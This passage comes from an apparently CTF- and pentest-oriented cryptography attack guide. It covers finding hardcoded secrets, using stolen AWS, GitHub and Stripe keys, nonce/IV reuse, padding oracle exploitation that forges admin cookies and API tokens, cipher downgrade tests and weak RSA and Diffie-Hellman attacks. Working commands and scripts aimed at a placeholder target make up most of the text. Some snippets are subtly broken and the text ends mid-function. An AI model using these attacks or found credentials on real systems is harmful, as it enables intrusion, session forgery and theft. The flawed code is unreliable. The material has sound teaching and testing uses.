gdb -p $PID
(gdb) gcore coredump
(gdb) quit

# Search for key patterns in coredump
strings coredump | grep -E "^[0-9a-fA-F]{32,}$"

# Using volatility for memory forensics (if memory image available)
volatility -f memory.raw linux_bash
volatility -f memory.raw linux_pslist
volatility -f memory.raw linux_dump_map --pid=PID -D output/
```

**Automated Scanning Tools:**

- **trufflehog**: Git repository secret scanner
- **gitleaks**: SAST tool for detecting hardcoded secrets
- **GitGuardian**: Real-time secret detection
- **detect-secrets**: Yelp's secret detection tool
- **SecretScanner**: DeepFence container/filesystem scanner

**Exploitation After Discovery:**

**Using Discovered API Keys:**

```bash
# AWS keys (AKIA...)
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
aws s3 ls  # List buckets
aws iam get-user  # Enumerate permissions

# GitHub tokens (ghp_...)
curl -H "Authorization: token ghp_XXXX" https://api.github.com/user/repos

# Stripe keys (sk_live_...)
curl https://api.stripe.com/v1/customers -u sk_live_XXXX:
```

**Decrypting Data with Hardcoded Keys:**

```bash
# AES decryption with discovered key
openssl enc -aes-256-cbc -d -in encrypted.dat -out decrypted.txt -K <hex_key> -iv <hex_iv>

# Python script for bulk decryption
python3 << EOF
from Crypto.Cipher import AES
import binascii

key = binascii.unhexlify('0123456789abcdef0123456789abcdef')
iv = binascii.unhexlify('00000000000000000000000000000000')
cipher = AES.new(key, AES.MODE_CBC, iv)

with open('encrypted.bin', 'rb') as f:
    ciphertext = f.read()
    
plaintext = cipher.decrypt(ciphertext)
print(plaintext)
EOF
```

**[Unverified]** Industry surveys suggest that hardcoded secrets appear in approximately 30% of repositories, though exact figures vary by study methodology and scope.

---

### Predictable Nonces/IVs

Nonces (Number used ONCE) and Initialization Vectors (IVs) must be unique and unpredictable for many cryptographic schemes. Reuse or predictability enables various attacks.

**Understanding Requirements:**

**Nonce Requirements by Algorithm:**

- **AES-GCM**: Nonce MUST NEVER repeat with same key (catastrophic failure)
- **AES-CBC**: IV must be unpredictable (but uniqueness alone insufficient)
- **AES-CTR**: Nonce must never repeat with same key
- **ChaCha20**: Nonce must never repeat with same key
- **RSA-OAEP**: Random padding required for security

**Detecting Predictable Nonces/IVs:**

**Traffic Analysis:**

```bash
# Capture encrypted traffic
tcpdump -i eth0 -w capture.pcap host target.com

# Extract and analyze IVs from TLS records (if protocol exposes them)
tshark -r capture.pcap -T fields -e data | xxd -r -p > encrypted_stream.bin

# For protocols with visible IVs (e.g., some custom crypto), extract first block
dd if=encrypted_stream.bin bs=16 count=1 | xxd

# Collect multiple samples
for i in {1..100}; do
  curl -s https://target.com/api/encrypt -d "data=test" | grep -o '"iv":"[^"]*"' | cut -d'"' -f4
done > ivs.txt

# Check for patterns
cat ivs.txt | sort | uniq -d  # Find duplicates
cat ivs.txt | while read iv; do echo $((16#$iv)); done | sort -n  # Check for sequential
```

**Statistical Analysis:**

```python
# Check IV randomness
import base64
from collections import Counter

ivs = []
with open('ivs.txt') as f:
    for line in f:
        ivs.append(base64.b64decode(line.strip()))

# Check for duplicates
if len(ivs) != len(set(ivs)):
    print("WARNING: Duplicate IVs found!")
    
# Check for sequential IVs
iv_ints = [int.from_bytes(iv, 'big') for iv in ivs]
diffs = [iv_ints[i+1] - iv_ints[i] for i in range(len(iv_ints)-1)]

# If all differences are 1, IVs are sequential
if all(d == 1 for d in diffs):
    print("WARNING: Sequential IVs detected!")
    
# Check low-order byte patterns (common weakness)
low_bytes = [iv[-1] for iv in ivs]
freq = Counter(low_bytes)
print(f"Low byte entropy: {len(freq)} unique values out of {len(low_bytes)}")
```

**Attack Scenarios:**

**AES-GCM Nonce Reuse (Authentication Key Recovery):**

[Unverified] The following attack requires identical nonces with the same key and is based on the "Forbidden Attack" technique described in cryptographic literature:

```python
# If same nonce used twice with AES-GCM, can recover authentication key
# Requires: Two ciphertexts (C1, C2) encrypted with same key and nonce

# Mathematical basis:
# C1 = P1 ⊕ Keystream
# C2 = P2 ⊕ Keystream (same keystream if nonce reused)
# C1 ⊕ C2 = P1 ⊕ P2

# If P1 or P2 known or can be guessed, recover keystream
# With keystream, can decrypt other messages and forge authentication tags

# Practical detection:
def detect_gcm_nonce_reuse(ciphertexts):
    """Check for nonce reuse in GCM mode"""
    nonces = [ct[:12] for ct in ciphertexts]  # Assuming 96-bit nonce
    if len(nonces) != len(set(nonces)):
        print("CRITICAL: GCM nonce reuse detected!")
        return True
    return False
```

**Tools for GCM Nonce Reuse:**

```bash
# Using cle for GCM nonce reuse exploitation
# https://github.com/nonce-disrespect/nonce-disrespect

# If two messages captured with reused nonce:
python3 gcm_nonce_reuse.py --ct1 ciphertext1.bin --ct2 ciphertext2.bin
```

**AES-CBC with Zero/Fixed IV:**

```bash
# If IV is always zero or fixed value, first block leaks information

# Encryption: C0 = E_k(P0 ⊕ IV)
# If IV = 0x00...00:
# C0 = E_k(P0)

# Attack: ECB-like for first block
# Collect multiple ciphertexts with same fixed IV
# Identical first plaintexts produce identical first ciphertext blocks

# Detection:
for i in {1..50}; do
  curl -s https://target.com/encrypt -d "data=AAAAAAAAAAAAAAAA" | 
  grep -o '"ciphertext":"[^"]*"' | cut -d'"' -f4
done > ciphertexts.txt

# Extract first blocks and check for repetition
cat ciphertexts.txt | while read ct; do
  echo "$ct" | base64 -d | xxd -p -l 16
done | sort | uniq -c | sort -nr
```

**CBC Bit Flipping with Predictable IV:**

```python
# If IV predictable and controllable ciphertext exists
# Can manipulate plaintext by flipping bits in IV

# CBC decryption: P0 = D_k(C0) ⊕ IV
# To change P0[i] from 'X' to 'Y': flip IV[i] such that X ⊕ IV[i] becomes Y ⊕ IV[i]
# Bit flip needed: IV[i] = IV[i] ⊕ (X ⊕ Y)

def cbc_bit_flip(iv, position, original_byte, target_byte):
    """Modify IV to change plaintext byte at position"""
    iv = bytearray(iv)
    iv[position] ^= original_byte ^ target_byte
    return bytes(iv)

# Example: Change "user=guest" to "user=admin"
original = b"user=guest"
target = b"user=admin"
position = 5  # 'g' -> 'a'

modified_iv = cbc_bit_flip(iv, position, ord('g'), ord('a'))
# Send ciphertext with modified IV
```

**CTR Mode Nonce Reuse (Keystream Recovery):**

```python
# CTR mode: C = P ⊕ F(Key, Nonce || Counter)
# If nonce reused, same keystream generated
# C1 ⊕ C2 = P1 ⊕ P2 (two-time pad)

def break_ctr_reuse(c1, c2):
    """Exploit CTR nonce reuse with known plaintext"""
    # If we know P1 (or part of it), recover keystream
    keystream_part = bytes([c1[i] ^ ord('known_plaintext'[i]) for i in range(len('known_plaintext'))])
    
    # Decrypt corresponding part of C2
    p2_part = bytes([c2[i] ^ keystream_part[i] for i in range(len(keystream_part))])
    return p2_part

# Detecting CTR nonce reuse:
# Collect multiple ciphertexts
# XOR pairs and look for readable text patterns (indicates plaintext XOR)
```

**Practical CTR Nonce Reuse Example:**

```bash
# If API encrypts with CTR and reuses nonces
# Capture two encrypted messages
curl -s https://target.com/encrypt -d "msg=AAAAA..." -o ct1.bin
curl -s https://target.com/encrypt -d "msg=BBBBB..." -o ct2.bin

# XOR ciphertexts
python3 << EOF
c1 = open('ct1.bin', 'rb').read()
c2 = open('ct2.bin', 'rb').read()
xor_result = bytes([c1[i] ^ c2[i] for i in range(min(len(c1), len(c2)))])
print(xor_result)
# If readable English appears, plaintext XOR confirmed (nonce reuse)
EOF
```

**Sequential Nonce Prediction:**

```python
# If nonces are sequential/predictable, can pre-compute and attack

# Collect nonces
nonces = [0x1000, 0x1001, 0x1002, 0x1003]  # Sequential

# Predict next nonce
next_nonce = nonces[-1] + 1

# Request encryption with predicted nonce might enable:
# - Pre-computation of keystream
# - Timing attacks
# - State manipulation in certain implementations
```

**Testing for Weak Nonce Generation:**

**Entropy Testing:**

```bash
# Collect nonces
for i in {1..1000}; do
  curl -s https://target.com/api/get_nonce
done > nonces.txt

# Analyze with ent
ent nonces.txt

# Check for patterns
cat nonces.txt | sort | uniq | wc -l  # Should be ~1000 unique
cat nonces.txt | sort | uniq -d  # Any duplicates?

# Test for sequential patterns
cat nonces.txt | awk '{print strtonum("0x" $1)}' | sort -n | uniq -c | sort -nr
```

**Protocol-Specific Testing:**

**TLS/SSL IV Predictability (CBC Beast Attack):**

```bash
# In TLS 1.0, CBC IVs were predictable (last ciphertext block)
# Testing (if legacy TLS 1.0 supported):

# Using testssl.sh
testssl.sh --protocols --ciphers https://target.com
# Check for CBC ciphers with TLS 1.0

# Manual test
openssl s_client -tls1 -cipher 'AES128-CBC' -connect target.com:443
# Analyze if IV predictable from previous ciphertext
```

**WPA2 KRACK (Key Reinstallation Attack):**

```bash
# Nonce reuse in 4-way handshake
# Using Krackattack tool (if testing authorized network)

# Check for vulnerability
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts/
./krack-test-client.py

# Detection: Capture handshakes and check for nonce reuse
tshark -r capture.pcap -Y "eapol" -T fields -e wlan.rsn.ie.pmkid
```

**Custom Protocol Analysis:**

```python
# Generic approach to test custom crypto protocols
import requests
import base64

def collect_nonces(endpoint, count=100):
    """Collect nonces from API"""
    nonces = []
    for _ in range(count):
        r = requests.get(endpoint)
        nonce = r.json().get('nonce')
        nonces.append(base64.b64decode(nonce))
    return nonces

def analyze_nonces(nonces):
    """Check for predictability"""
    # Duplicates
    if len(nonces) != len(set(nonces)):
        print("[!] Duplicate nonces found")
    
    # Sequential check
    nonce_ints = [int.from_bytes(n, 'big') for n in nonces]
    if all(nonce_ints[i] + 1 == nonce_ints[i+1] for i in range(len(nonce_ints)-1)):
        print("[!] Sequential nonces detected")
    
    # Timestamp correlation
    import time
    timestamps = [time.time() for _ in nonces]
    # Plot and check correlation
    
# Usage
nonces = collect_nonces('https://target.com/api/nonce')
analyze_nonces(nonces)
```

**Exploitation Frameworks:**

**Cryptographic Nonce/IV Attacks:**

```bash
# Using cryptanalib for automated testing
# https://github.com/nccgroup/featherduster

featherduster capture.bin
# Analyzes for ECB, CBC, CTR issues, including nonce reuse

# Manual XOR analysis for nonce reuse
python3 << 'EOF'
import sys
from itertools import combinations

def xor_bytes(b1, b2):
    return bytes([a ^ b for a, b in zip(b1, b2)])

def analyze_xor_pairs(ciphertexts):
    """Check if XOR of ciphertext pairs reveals plaintext patterns"""
    for (i, ct1), (j, ct2) in combinations(enumerate(ciphertexts), 2):
        xor_result = xor_bytes(ct1, ct2)
        # Check if result contains readable ASCII (suggests plaintext XOR)
        readable = sum(32 <= b < 127 for b in xor_result)
        if readable > len(xor_result) * 0.5:  # >50% readable
            print(f"[!] Possible nonce reuse between CT{i} and CT{j}")
            print(f"XOR result: {xor_result}")
            return True
    return False

# Load ciphertexts
ciphertexts = [open(f'ct{i}.bin', 'rb').read() for i in range(10)]
analyze_xor_pairs(ciphertexts)
EOF
````

**Real-World CTF Patterns:**

[Inference] In CTF challenges involving nonce/IV issues, common scenarios include:
- Encryption oracles that reuse nonces when encrypting multiple plaintexts
- APIs returning both ciphertext and nonce/IV where sequential patterns exist
- Protocol implementations with timestamp-based nonces
- AES-GCM services vulnerable to authentication bypass via nonce reuse
- Challenge files containing multiple encryptions with visible repeated nonces

**Mitigation Verification:**
```python
# Test if service properly generates random nonces
def test_nonce_quality(endpoint, iterations=1000):
    """Comprehensive nonce quality testing"""
    import requests
    from collections import Counter
    
    nonces = []
    for _ in range(iterations):
        r = requests.get(endpoint)
        nonces.append(r.json()['nonce'])
    
    # Tests:
    # 1. No duplicates
    duplicates = len(nonces) - len(set(nonces))
    print(f"Duplicates: {duplicates}/{iterations}")
    
    # 2. Chi-square test for uniform distribution
    byte_freq = Counter()
    for nonce in nonces:
        for byte in bytes.fromhex(nonce):
            byte_freq[byte] += 1
    
    expected = len(nonces) * len(bytes.fromhex(nonces[0])) / 256
    chi_square = sum((obs - expected)**2 / expected for obs in byte_freq.values())
    print(f"Chi-square: {chi_square} (should be ~255)")
    
    # 3. Autocorrelation (sequential dependence)
    nonce_ints = [int(n, 16) for n in nonces]
    diffs = [abs(nonce_ints[i+1] - nonce_ints[i]) for i in range(len(nonce_ints)-1)]
    avg_diff = sum(diffs) / len(diffs)
    print(f"Average sequential difference: {avg_diff}")
    
    return duplicates == 0 and 200 < chi_square < 310
````

---

### Improper Padding Validation

Padding oracle attacks exploit error messages or timing differences in padding validation to decrypt ciphertexts byte-by-byte without knowing the key. Most commonly affects CBC mode with PKCS#7 padding.

**Understanding Padding Schemes:**

**PKCS#7 Padding:**

```python
# Padding adds N bytes of value N to reach block size
# Block size: 16 bytes (AES)

# Example:
plaintext = b"HELLO"  # 5 bytes
padded = b"HELLO\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"  # 11 bytes padding

# If plaintext is multiple of block size, add full block:
plaintext = b"SIXTEEN_BYTE_TXT"  # 16 bytes
padded = b"SIXTEEN_BYTE_TXT\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10"

# Valid padding patterns:
# \x01
# \x02\x02
# \x03\x03\x03
# ...
# \x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10
```

**Identifying Padding Oracles:**

**Error-Based Detection:**

```bash
# Send malformed ciphertext and observe errors
# Different errors for padding vs. MAC failures indicate oracle

# Valid ciphertext
curl -X POST https://target.com/decrypt \
  -d "ciphertext=VALID_BASE64" \
  -w "\n%{http_code}\n"
# Response: HTTP 200

# Invalid padding (flip last byte)
python3 -c "
import base64
ct = base64.b64decode('VALID_BASE64')
ct = ct[:-1] + bytes([ct[-1] ^ 0x01])
print(base64.b64encode(ct).decode())
" | xargs -I {} curl -X POST https://target.com/decrypt -d "ciphertext={}" -v

# Look for:
# - "Padding error" vs "Decryption failed"
# - HTTP 400 vs 500
# - Different error messages
# - Different response times
```

**Timing-Based Detection:**

```bash
# Measure response times for valid vs invalid padding
for i in {1..100}; do
  { time curl -s -X POST https://target.com/decrypt \
    -d "ciphertext=$VALID_CT" ; } 2>&1 | grep real
done > valid_times.txt

for i in {1..100}; do
  { time curl -s -X POST https://target.com/decrypt \
    -d "ciphertext=$INVALID_PADDING_CT" ; } 2>&1 | grep real
done > invalid_times.txt

# Statistical analysis
python3 << EOF
valid = [float(line.split()[1].replace('real','').replace('s','')) 
         for line in open('valid_times.txt')]
invalid = [float(line.split()[1].replace('real','').replace('s','')) 
           for line in open('invalid_times.txt')]

print(f"Valid padding avg: {sum(valid)/len(valid):.4f}s")
print(f"Invalid padding avg: {sum(invalid)/len(invalid):.4f}s")
print(f"Difference: {abs(sum(valid)/len(valid) - sum(invalid)/len(invalid)):.4f}s")

# If difference > ~10ms, timing oracle likely exists
EOF
```

**Exploiting Padding Oracles:**

**Manual Padding Oracle Attack (CBC):**

```python
# CBC Decryption: P_i = D_k(C_i) ⊕ C_{i-1}
# By manipulating C_{i-1}, can control P_i and test padding

def padding_oracle_attack_byte(oracle, ciphertext, block_num, byte_pos):
    """
    Decrypt single byte using padding oracle
    
    Args:
        oracle: Function that returns True for valid padding
        ciphertext: Full ciphertext (bytes)
        block_num: Target block number (0-indexed)
        byte_pos: Byte position in block (0-15)
    
    Returns:
        Decrypted byte value
    """
    block_size = 16
    
    # Extract blocks
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    target_block = blocks[block_num]
    prev_block = blocks[block_num - 1] if block_num > 0 else b'\x00' * block_size
    
    # Desired padding value (e.g., \x01 for last byte)
    padding_value = block_size - byte_pos
    
    # Try all possible byte values (0-255)
    for guess in range(256):
        # Create modified previous block
        modified_prev = bytearray(prev_block)
        
        # Set up bytes after target to produce correct padding
        for i in range(byte_pos + 1, block_size):
            # XOR with known intermediate value to get padding_value
            modified_prev[i] = prev_block[i] ^ known_intermediate[i] ^ padding_value
        
        # Modify target byte
        modified_prev[byte_pos] = prev_block[byte_pos] ^ guess ^ padding_value
        
        # Test with oracle
        test_ct = bytes(modified_prev) + target_block
        if oracle(test_ct):
            # Found valid padding - calculate intermediate value
            intermediate = guess ^ padding_value
            plaintext_byte = intermediate ^ prev_block[byte_pos]
            return plaintext_byte
    
    return None

# Example oracle function
def check_padding(ciphertext):
    """Returns True if padding valid"""
    import requests
    r = requests.post('https://target.com/decrypt',
                      data={'ct': base64.b64encode(ciphertext)})
    return r.status_code == 200  # Or check for specific error message
```

**Automated Tools:**

**Using PadBuster:**

```bash
# PadBuster - automated padding oracle exploitation
# URL-based oracle
padbuster http://target.com/decrypt.php "ENCRYPTED_COOKIE_VALUE" 16 \
  -cookies "auth=ENCRYPTED_COOKIE_VALUE" \
  -encoding 0

# Parameters:
# 16 = block size (bytes)
# -encoding 0 = hex, 1 = base64, 2 = base64 URL-safe

# Encrypt arbitrary plaintext (if oracle allows)
padbuster http://target.com/decrypt.php "SAMPLE_ENCRYPTED" 16 \
  -cookies "auth=SAMPLE_ENCRYPTED" \
  -plaintext "user=admin" \
  -encoding 0

# With error string detection
padbuster http://target.com/decrypt.php "CIPHERTEXT" 16 \
  -error "Padding is incorrect"

# With custom headers
padbuster http://target.com/api/decrypt "CIPHERTEXT" 16 \
  -headers "Authorization: Bearer TOKEN" \
  -post "data=CIPHERTEXT"
```

**Using Padding Oracle Attacker (Python):**

```bash
# https://github.com/mwielgoszewski/python-paddingoracle

git clone https://github.com/mwielgoszewski/python-paddingoracle.git
cd python-paddingoracle

# Create custom oracle script
cat > exploit.py << 'EOF'
from paddingoracle import BadPaddingException, PaddingOracle
import requests
import base64

class PadOracle(PaddingOracle):
    def oracle(self, data):
        """Send data to target and check response"""
        r = requests.post('https://target.com/decrypt',
                          data={'ciphertext': base64.b64encode(data).decode()})
        
        if 'padding' in r.text.lower() or r.status_code == 400:
            raise BadPaddingException
        
        # Valid padding (or MAC error, which comes after padding check)
        return

# Usage
oracle = PadOracle()
ciphertext = base64.b64decode('ENCRYPTED_DATA')
plaintext = oracle.decrypt(ciphertext, block_size=16)
print(f"Decrypted: {plaintext}")
EOF

python3 exploit.py
```

**Using Burp Suite:**

```bash
# Burp Suite Intruder for manual padding oracle

# 1. Intercept decrypt request
# 2. Send to Intruder
# 3. Set payload position on last byte of ciphertext
# 4. Payload type: Numbers (0-255)
# 5. Start attack
# 6. Analyze responses:
#    - Different length/status/time = padding oracle
#    - Response showing "valid padding" for specific values

# Extract results
# Valid padding occurs when modified byte XORed with intermediate
# produces valid padding (0x01, 0x02\x02, etc.)
```

**Advanced Padding Oracle Scenarios:**

**CBC-R (Randomized CBC) Attack:**

```python
# Some implementations randomize IV per message
# Attack still works but requires IV manipulation

def attack_with_random_iv(oracle, ciphertext):
    """Padding oracle when IV randomized"""
    # Server generates: IV || C1 || C2 || ...
    # We control IV to manipulate P1
    
    iv = ciphertext[:16]
    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
    
    # Decrypt by manipulating IV (acts as C0)
    plaintext = padding_oracle_attack_byte(oracle, iv + blocks[1], 1, byte_pos)
    return plaintext
```

**Encrypt-then-MAC (Proper) vs MAC-then-Encrypt (Weak):**

```bash
# Encrypt-then-MAC: MAC covers ciphertext (padding oracle mitigated)
# MAC-then-Encrypt: MAC inside ciphertext (still vulnerable)

# Testing:
# Send ciphertext with flipped bits
# If MAC fails BEFORE padding check: Encrypt-then-MAC (secure)
# If padding error returned: MAC-then-Encrypt (vulnerable)

curl -X POST https://target.com/decrypt -d "ct=MODIFIED_CT" -v
# Response: "MAC verification failed" = Secure
# Response: "Invalid padding" = Vulnerable
```

**Compressing Oracle (BREACH-style):**

```python
# When compression applied before encryption
# Padding differences leak information about compression efficiency

def test_compression_oracle(oracle, secret_prefix, guess):
    """Test if guess matches secret by observing ciphertext length"""
    # Server compresses: secret_prefix + user_input
    # Correct guess compresses better (shorter ciphertext)
    
    ct1 = oracle(secret_prefix + 'A' * 100)  # Baseline
    ct2 = oracle(secret_prefix + guess + 'A' * 100)
    
    if len(ct2) < len(ct1):
        return True  # Guess likely correct (compressed better)
    return False
```

**Timing-Based Padding Oracles:**

```bash
# If no error differentiation, timing differences may exist

# High-precision timing measurement
python3 << 'EOF'
import requests
import time
import statistics

def timing_oracle(ciphertext, iterations=100):
    """Measure timing for padding validation"""
    times = []
    for _ in range(iterations):
        start = time.perf_counter()
        requests.post('https://target.com/decrypt', 
                     data={'ct': ciphertext},
                     timeout=5)
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    
    # Remove outliers
    times_sorted = sorted(times)
    trimmed = times_sorted[10:-10]  # Remove top/bottom 10%
    
    return statistics.median(trimmed)

# Compare timings
valid_time = timing_oracle(valid_ciphertext)
invalid_time = timing_oracle(invalid_padding_ciphertext)

print(f"Valid padding: {valid_time:.6f}s")
print(f"Invalid padding: {invalid_time:.6f}s")
print(f"Delta: {abs(valid_time - invalid_time)*1000:.2f}ms")

# Even 1-2ms difference can be exploited with enough samples
EOF
```

**Lucky13 Attack (TLS CBC Timing):**

```bash
# Lucky13 exploits timing difference in TLS CBC padding validation
# Affects TLS 1.0-1.2 with CBC ciphers

# Testing with testssl.sh
testssl.sh --protocols --ciphers https://target.com | grep CBC

# Check for Lucky13 vulnerability
testssl.sh -U https://target.com
# Look for: "Lucky13 (CVE-2013-0169)"

# Manual exploitation requires timing measurement over network
# [Unverified] Practical exploitation often requires <5ms timing precision
```

**POODLE Attack (SSL 3.0 Padding Oracle):**

```bash
# SSL 3.0 doesn't verify padding bytes (only length)
# Enables padding oracle via downgrade attack

# Check SSL 3.0 support
nmap --script ssl-enum-ciphers -p 443 target.com | grep "SSLv3"

# Using testssl.sh
testssl.sh -p https://target.com
# Look for SSLv3 support

# POODLE exploitation (if SSL 3.0 enabled):
# Force downgrade from TLS to SSL 3.0
# Exploit weak padding to decrypt HTTPS cookies
```

**Padding Oracle in Block Cipher Modes:**

**ECB Mode (No IV, Still Has Padding):**

```python
# ECB has no IV but still needs padding
# Can detect padding oracle to determine plaintext length

def ecb_padding_oracle_length(oracle):
    """Determine plaintext length via padding oracle in ECB"""
    # Encrypt empty plaintext
    ct_empty = oracle("")
    baseline_blocks = len(ct_empty) // 16
    
    # Add bytes until block count increases
    for i in range(1, 17):
        ct = oracle("A" * i)
        blocks = len(ct) // 16
        if blocks > baseline_blocks:
            # Padding added new block
            plaintext_length = (baseline_blocks * 16) - (16 - i + 1)
            return plaintext_length
```

**OFB/CFB Modes (No Padding):**

```bash
# OFB and CFB are stream cipher modes - no padding required
# Padding oracles don't apply, but other attacks possible
# (e.g., bit flipping, nonce reuse)
```

**Practical CTF Exploitation:**

**Cookie Decryption:**

```bash
# Scenario: Encrypted cookie contains "user=guest"
# Goal: Decrypt cookie, modify to "user=admin", re-encrypt

# 1. Decrypt existing cookie
padbuster http://target.com/check_auth "ENCRYPTED_COOKIE" 16 \
  -cookies "session=ENCRYPTED_COOKIE" \
  -encoding 1

# Output: Decrypted value: user=guest;role=user

# 2. Encrypt desired value
padbuster http://target.com/check_auth "ENCRYPTED_COOKIE" 16 \
  -cookies "session=ENCRYPTED_COOKIE" \
  -encoding 1 \
  -plaintext "user=admin;role=admin"

# Output: Encrypted: [NEW_COOKIE_VALUE]

# 3. Use new cookie
curl -b "session=NEW_COOKIE_VALUE" http://target.com/admin
```

**API Token Manipulation:**

```python
# Encrypted API token format: {"user":"guest","exp":1234567890}
# Exploit padding oracle to decrypt and re-encrypt with admin privileges

import requests
import base64
from paddingoracle import PaddingOracle, BadPaddingException

class TokenOracle(PaddingOracle):
    def oracle(self, data):
        r = requests.get('https://api.target.com/verify',
                        headers={'X-Auth-Token': base64.b64encode(data).decode()})
        if r.status_code == 400:  # Padding error
            raise BadPaddingException
        return

oracle = TokenOracle()
encrypted_token = base64.b64decode(captured_token)

# Decrypt
plaintext = oracle.decrypt(encrypted_token, block_size=16)
print(f"Token contents: {plaintext}")

# Modify and re-encrypt
new_plaintext = b'{"user":"admin","exp":9999999999}'
new_token = oracle.encrypt(new_plaintext, block_size=16)
print(f"New token: {base64.b64encode(new_token).decode()}")
```

**File Decryption:**

```bash
# Scenario: Encrypted file upload system with padding oracle

# 1. Upload file and capture encrypted version
curl -F "file=@test.txt" https://target.com/upload > encrypted.bin

# 2. Use padding oracle to decrypt
python3 << 'EOF'
from paddingoracle import PaddingOracle, BadPaddingException
import requests

class FileOracle(PaddingOracle):
    def oracle(self, data):
        r = requests.post('https://target.com/decrypt_file',
                         files={'file': data})
        if 'invalid padding' in r.text.lower():
            raise BadPaddingException

oracle = FileOracle()
with open('encrypted.bin', 'rb') as f:
    encrypted = f.read()

plaintext = oracle.decrypt(encrypted, block_size=16)
with open('decrypted.txt', 'wb') as f:
    f.write(plaintext)
EOF
```

**Defense Detection:**

```bash
# Check if padding oracle is mitigated:

# 1. Constant-time comparison
# Send various invalid paddings and measure timing
# If all invalid paddings have same response time: Mitigated

# 2. Encrypt-then-MAC
# Flip bits in ciphertext
# If MAC fails before padding checked: Mitigated

# 3. Authenticated encryption (GCM, ChaCha20-Poly1305)
# No separate padding - oracle not applicable

# 4. Generic error messages
curl -X POST https://target.com/decrypt -d "ct=INVALID"
# Response: "Decryption failed" (generic)
# vs "Invalid PKCS#7 padding" (oracle leak)
```

**Tools Summary:**

- **PadBuster**: Automated padding oracle exploitation (Perl)
- **python-paddingoracle**: Padding oracle library (Python)
- **Burp Suite Intruder**: Manual byte-by-byte testing
- **testssl.sh**: TLS padding oracle detection (Lucky13, POODLE)
- **Padding Oracle Attack Tool (POET)**: GUI-based exploitation

---

### Unvalidated Cryptographic Parameters

Failure to validate cryptographic parameters (key sizes, curve parameters, modulus values, algorithm choices) enables various attacks through parameter injection or manipulation.

**Algorithm Negotiation Attacks:**

**Downgrade Attacks:**

```bash
# Force weak algorithm selection in protocol negotiation

# TLS cipher suite downgrade
openssl s_client -cipher 'DES-CBC3-SHA' -connect target.com:443
openssl s_client -cipher 'RC4-MD5' -connect target.com:443
openssl s_client -cipher 'EXPORT' -connect target.com:443

# Test for weak cipher acceptance
nmap --script ssl-enum-ciphers -p 443 target.com

# Look for:
# - NULL ciphers (no encryption)
# - EXPORT ciphers (weak 40/56-bit keys)
# - DES/3DES (64-bit blocks, vulnerable to Sweet32)
# - RC4 (biased keystream)
# - MD5-based MACs (collision vulnerable)

# Using testssl.sh for comprehensive analysis
testssl.sh --ciphers --protocols target.com
```

**SSH Algorithm Downgrade:**

```bash
# Test accepted algorithms
ssh -vv user@target.com 2>&1 | grep "kex\|cipher\|mac"

# Check for weak algorithms:
nmap --script ssh2-enum-algos target.com

# Look for:
# Key exchange: diffie-hellman-group1-sha1 (1024-bit, weak)
# Ciphers: arcfour, 3des-cbc, aes128-cbc
# MACs: hmac-md5, hmac-sha1-96

# Force weak algorithm
ssh -c arcfour -m hmac-md5 user@target.com
```

**Testing Parameter Validation:**

**RSA Modulus Manipulation:**

```python
# If application accepts user-provided RSA public keys
# Can supply weak/crafted moduli

# Small modulus (easily factored)
from Crypto.PublicKey import RSA

weak_key = RSA.generate(512)  # 512-bit key (factorable)
print(weak_key.publickey().export_key())

# Supply to application
curl -X POST https://target.com/api/key \
  -d "pubkey=$(cat weak_public.pem)"

# Then factor modulus to recover private key
```

**Factoring Weak RSA Modulus:**

```bash
# Extract modulus from public key
openssl rsa -pubin -in public.pem -text -noout | grep -A 10 "Modulus"

# Convert to decimal
python3 << 'EOF'
from Crypto.PublicKey import RSA
key = RSA.import_key(open('public.pem').read())
n = key.n
e = key.e
print(f"n = {n}")
print(f"e = {e}")
EOF

# Factor small modulus (< 1024 bits)
# Using factordb.com
curl "http://factordb.com/api?query=$MODULUS"

# Using yafu for larger factorization
yafu "factor($MODULUS)"

# Using msieve
msieve -q -v $MODULUS

# Once factors (p, q) obtained, reconstruct private key
python3 << 'EOF'
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse

n = p * q
e = 65537
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

key = RSA.construct((n, e, d, p, q))
print(key.export_key().decode())
EOF
```

**Elliptic Curve Parameter Injection:**

**Invalid Curve Attack:**

```python
# Supply point not on legitimate curve
# If validation missing, can move computation to weak curve

# Example: Bitcoin/secp256k1 context
from ecdsa import SECP256k1, Point
from ecdsa.ellipticcurve import CurveFp

# Legitimate curve parameters
p = SECP256k1.curve.p()
a = SECP256k1.curve.a()
b = SECP256k1.curve.b()

# Create invalid point (not on curve)
# Normal equation: y² ≡ x³ + ax + b (mod p)
# Supply x, y that don't satisfy equation

invalid_x = 12345
invalid_y = 67890  # Random value not satisfying curve equation

# If server doesn't validate point is on curve:
# Can exploit to leak private key or forge signatures
```

**Small Subgroup Attack:**

```python
# Supply point with small order
# Forces computation into small subgroup, leaking key bits

# Attack against Diffie-Hellman with composite-order groups
# If g has small order, discrete log becomes easy

def small_subgroup_attack(p, g, public_key):
    """
    Exploit weak subgroup in DH
    [Unverified] Attack success depends on subgroup structure
    """
    # Find small-order elements
    # Send small-order public keys to extract key bits
    
    # Example: If p-1 has small factors
    # Can recover key modulo small factors via CRT
    pass
```

**Diffie-Hellman Parameter Attacks:**

**Small Prime Attack:**

```python
# Accept user-supplied DH parameters with small prime
import socket
import struct

def send_weak_dh_params(target, port):
    """Send DH params with small prime (factorable)"""
    p = 1009  # Small prime
    g = 2
    
    # Craft DH parameter packet (protocol-specific)
    # When server accepts, DH becomes breakable
    
    # Discrete log in small group
    # Bruteforce: y = g^x mod p
    for x in range(p):
        if pow(g, x, p) == received_public_key:
            print(f"Private key: {x}")
            return x
```

**Non-Safe Prime:**

```bash
# Safe prime: p = 2q + 1 (where q also prime)
# Non-safe primes enable small subgroup attacks

# Check if prime is safe:
python3 << 'EOF'
def is_safe_prime(p):
    """Check if p is safe prime"""
    if not is_prime(p):
        return False
